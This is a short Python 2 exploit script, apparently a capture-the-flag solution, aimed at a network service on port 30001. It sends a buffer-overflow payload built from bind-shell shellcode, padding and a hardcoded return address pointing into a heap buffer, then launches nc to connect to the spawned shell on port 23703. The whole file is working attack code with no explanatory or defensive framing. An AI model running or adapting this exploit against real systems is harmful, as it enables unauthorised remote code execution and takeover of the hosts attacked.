#!/usr/bin/env python

# TARGET = ("127.0.0.1", 30001)
TARGET = ("fa.ntast.dk", 30001)

#~~~~~~~~~
import sys, os, socket, struct
DEBUG  = 'DEBUG' in sys.argv
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(TARGET)
def p(a):
  return struct.pack('I', a)
def send(dat):
    sock.send(dat)
def recv(num = 1024):
    res = sock.recv(num)
    if DEBUG:
        print res
    return res
def comm(dat):
    send(dat)
    return recv()
def close():
    sock.close()
def recv_and_close():
    while recv():
        pass
    close()
#~~~~~~~~~

with open('bindshell') as f:
  shellcode = f.read()

heap_buffer = p(0x0804a060)
payload = shellcode + 'A' * (0xd4 - len(shellcode)) + heap_buffer + '\n'
send(payload)

os.execv('/bin/nc', ['nc', TARGET[0], '23703'])
